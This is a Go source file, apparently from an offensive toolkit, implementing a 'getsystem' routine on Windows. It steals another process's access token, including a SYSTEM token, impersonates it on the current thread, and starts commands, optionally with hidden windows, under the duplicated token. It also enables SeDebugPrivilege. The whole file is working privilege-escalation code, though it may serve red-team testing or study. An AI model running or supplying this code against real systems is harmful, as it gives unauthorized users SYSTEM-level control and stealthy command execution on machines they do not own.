package getsystem

import (
	"fmt"
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"
)

var (
	advapi32                    = windows.NewLazySystemDLL("advapi32.dll")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	procCreateProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")
)

const (
	OpenProcTokenPerms uint32 = windows.TOKEN_READ |
		windows.TOKEN_DUPLICATE |
		windows.TOKEN_IMPERSONATE
	TokenDupPerms uint32 = windows.TOKEN_QUERY |
		windows.TOKEN_DUPLICATE |
		windows.TOKEN_ASSIGN_PRIMARY |
		windows.TOKEN_ADJUST_DEFAULT |
		windows.TOKEN_ADJUST_SESSIONID

	sePrivilegeEnabled   = 0x00000002
	flagCreateNewConsole = 0x00000010
)

// OnThread will steal a token from the given process. It can be other users as well
// not just system. The token will be applied to the current thread until revtoself
// is called, or the thread exits. Only certain processes can have their SYSTEM token
// stolen. You have TOKEN_OWNER in the DACL of the SYSTEM process in order to steal it.
func OnThread(pid int) error {
	tokenH, err := tokenForPid(pid)
	if err != nil {
		return errors.Wrap(err, "token for pid failed")
	}
	defer tokenH.Close()

	retCode, _, ntErr := procImpersonateLoggedOnUser.Call(uintptr(tokenH))
	if retCode == 0 {
		return errors.Wrap(ntErr, "could not impersonte token user")
	}
	return nil
}

// InNewProcess will duplicate the token from given pid and start a new process
// using the winapi's DuplicateTokenEx and StartProccessWithTokenW with the given
// command
func InNewProcess(pid int, cmd string, hidden bool) error {
	tokenH, err := tokenForPid(pid)
	if err != nil {
		return errors.Wrap(err, "token for pid failed")
	}

	var dupTokenH windows.Token
	err = windows.DuplicateTokenEx(
		tokenH,
		TokenDupPerms,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&dupTokenH,
	)
	if err != nil {
		return errors.Wrap(err, "token duplication failed")
	}

	var show uint16 = windows.SW_NORMAL
	if hidden {
		show = windows.SW_HIDE
	}

	si := &windows.StartupInfo{}
	si.Cb = uint32(unsafe.Sizeof(*si))
	si.Flags |= windows.STARTF_USESHOWWINDOW
	si.ShowWindow = show

	pi := &windows.ProcessInformation{}

	var cmdP *uint16
	cmdP, err = windows.UTF16PtrFromString(cmd)
	if err != nil {
		return errors.Wrap(err, "failed to convert utf16 string")
	}

	flags := flagCreateNewConsole | windows.CREATE_UNICODE_ENVIRONMENT
	retCode, _, ntErr := procCreateProcessWithTokenW.Call(
		uintptr(dupTokenH),            //  hToken,
		0,                             //  dwLogonFlags,
		uintptr(0),                    //  lpApplicationName,
		uintptr(unsafe.Pointer(cmdP)), //  lpCommandLine,
		uintptr(flags),                //  dwCreationFlags,
		uintptr(0),                    //  lpEnvironment,
		uintptr(0),                    //  lpCurrentDirectory,
		uintptr(unsafe.Pointer(si)),   //  lpStartupInfo,
		uintptr(unsafe.Pointer(pi)),   //  lpProcessInformation
	)
	if retCode == 0 {
		return errors.Wrap(ntErr, "could not create process with token")
	}
	return nil
}

// DebugPriv enables the SeDebugPrivilege
func DebugPriv() error {
	return SePrivEnable("SeDebugPrivilege")
}

// SePrivEnable takes a privilege name and enables it
func SePrivEnable(privString string) (err error) {
	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(privString), &luid)
	if err != nil {
		return errors.Wrap(err, "privilege lookup failed")
	}

	privs := &windows.Tokenprivileges{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = uint32(sePrivilegeEnabled)

	var tokenH windows.Token
	err = windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES, &tokenH)
	if err != nil {
		return errors.Wrap(err, "failed to open process token")
	}
	defer tokenH.Close()

	err = windows.AdjustTokenPrivileges(tokenH, false, privs, uint32(unsafe.Sizeof(privs)), nil, nil)
	if err != nil {
		return errors.Wrap(err, "failed to adjust token privilege")
	}
	return
}

// TokenOwner will resolve the primary token or thread owner of the given
// handle
func TokenOwner(hToken windows.Token) (string, error) {
	tokenUser, err := hToken.GetTokenUser()
	if err != nil {
		return "", errors.Wrap(err, "could not get token user")
	}
	u, d, _, err := tokenUser.User.Sid.LookupAccount("")
	if err != nil {
		return "", errors.Wrap(err, "could not find SID for user")
	}
	return fmt.Sprintf(`%s\%s`, d, u), err
}

// TokenOwnerFromPid will resolve the primary token or thread owner of the given
// pid
func TokenOwnerFromPid(pid int) (string, error) {
	hToken, err := tokenForPid(pid)
	if err != nil {
		return "", errors.Wrap(err, "failed to get token from pid")
	}

	return TokenOwner(hToken)
}

func tokenForPid(pid int) (tokenH windows.Token, err error) {
	hProc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, uint32(pid))
	if err != nil {
		err = errors.Wrap(err, "failed to open process")
		return
	}

	err = windows.OpenProcessToken(hProc, OpenProcTokenPerms, &tokenH)
	if err != nil {
		err = errors.Wrap(err, "failed to open token")
	}
	return
}
